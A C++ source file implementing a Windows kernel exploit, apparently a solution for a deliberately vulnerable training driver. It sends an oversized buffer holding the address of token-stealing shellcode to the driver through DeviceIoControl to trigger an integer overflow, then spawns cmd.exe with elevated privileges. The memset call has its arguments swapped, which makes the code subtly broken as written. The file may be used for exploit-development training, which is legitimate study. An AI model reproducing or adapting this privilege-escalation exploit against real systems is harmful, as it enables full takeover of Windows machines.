#include <Windows.h>
#include <iostream>

#include "Solutions.h"
#include "ioctal_codes.h"
#include "random_str.h"
#include "utils.h"

using namespace std;

NTSTATUS Solutions::TriggerIntegerOverflow() {
	DWORD dwBufSize = 0x828;
	DWORD lTerminatorValue = 0xBAD0B0B0;
	PUCHAR lpInBuffer = NULL;
	DWORD dwIoctl = IOCTL_INTEGER_OVERFLOW;
	DWORD dwBytesReturned = NULL;
	PVOID pEopPayload = &tokenStealingShellcode;

	lpInBuffer = (PUCHAR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwBufSize + sizeof(PULONG) * 2);
	if (!lpInBuffer) {
		cout << "[-] Could not allocate buffer :(" << endl;
		return 1;
	}

	memset(lpInBuffer, dwBufSize, 0x41);
	*(PULONG)(lpInBuffer + dwBufSize) = (ULONG)pEopPayload;
	*(PULONG)(lpInBuffer + dwBufSize + 4) = lTerminatorValue;

	cout << "[+] Prepering to jump to shellcode - " << hex << (ULONG)pEopPayload << endl;

	if (!DeviceIoControl(_hDeviceHandle, dwIoctl, (LPVOID)lpInBuffer, 0xffffffff,
		NULL, NULL, &dwBytesReturned, NULL)) {
		cout << "[-] Could not talk with the driver - " << GetLastError() << endl;
		HeapFree(GetProcessHeap(), NULL, lpInBuffer);
		return 1;
	}

	cout << "[+] Succesfully talked with the driver" << endl;

	system("cmd.exe");

	return 0;
}

